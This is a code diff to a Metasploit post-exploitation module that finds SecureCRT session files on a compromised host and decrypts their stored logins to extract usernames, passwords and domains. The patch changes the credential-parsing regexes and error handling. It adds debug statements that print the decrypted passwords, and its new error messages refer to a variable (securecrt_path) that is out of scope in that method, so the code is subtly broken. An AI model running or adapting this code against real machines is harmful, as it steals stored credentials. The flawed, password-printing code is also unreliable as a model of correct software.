@@ -62,8 +62,13 @@ class MetasploitModule < Msf::Post
   def enum_session_file(path)
     config_ini = []
     tbl = []
-    print_status("Searching for session files in #{path}")
-    config_ini += session.fs.file.search(path, '*.ini')
+    begin
+      print_status("Searching for session files in #{path}")
+      config_ini += session.fs.file.search(path, '*.ini')
+      fail_with(Msf::Module::BadConfig, "Could not find any session files at #{securecrt_path}") if config_ini == []
+    rescue Rex::Post::Meterpreter::RequestError
+      fail_with(Msf::Module::BadConfig, "Could not access the directory at #{securecrt_path} or it doesn't exist")
+    end
 
     # enum session file
     config_ini.each do |item|
@@ -77,11 +82,14 @@ class MetasploitModule < Msf::Post
       protocol = Regexp.compile('S:"Protocol Name"=([^\s]+)').match(file) ? Regexp.last_match(1) : nil
       hostname = Regexp.compile('S:"Hostname"=([^\s]+)').match(file) ? Regexp.last_match(1) : nil
       decrypted_script = Regexp.compile('S:"Login Script V3"=02:([0-9a-f]+)').match(file) ? securecrt_crypto_v2(Regexp.last_match(1)) : nil
+      p decrypted_script
       if !decrypted_script.nil?
-        username = decrypted_script.match(/login name:\x1F(\S+)\x1F0\x1Fpass/u)[1]
-        password = decrypted_script.match(/password:\x1F([\S]+)\x1F0/u)[1]
-        domain = decrypted_script.match(/Windows Domain:\x1F([\S]+)\x1F/u) ? decrypted_script.match(/Windows Domain:\x1F([\S]+)\x1F/u)[1] : nil
-        if !domain.nil?
+        username = decrypted_script.match(/login(?: name)?:\x1F(\S+)\x1F(?:[\d])\x1Fpass/u) ? Regexp.last_match(1) : nil
+        p username
+        password = decrypted_script.match(/password:\x1F([\S]+)\x1F/u) ? Regexp.last_match(1) : nil
+        p password
+        domain = decrypted_script.match(/Windows Domain:\x1F([\S]+)\x1F/u) ? Regexp.last_match(1) : nil
+        if !domain.nil? && !username.nil?
           username = domain + '\\' + username
         end
       else
@@ -182,7 +190,7 @@ class MetasploitModule < Msf::Post
     end
 
     if securecrt_path.to_s.empty?
-      print_error('Could not find the registry entry for the SecureCRT session path. Ensure that SecureCRT is installed on the target.')
+      fail_with(Msf::Module::NotFound, 'Could not find the registry entry for the SecureCRT session path. Ensure that SecureCRT is installed on the target.')
     else
       result = enum_session_file(securecrt_path)
       columns = [
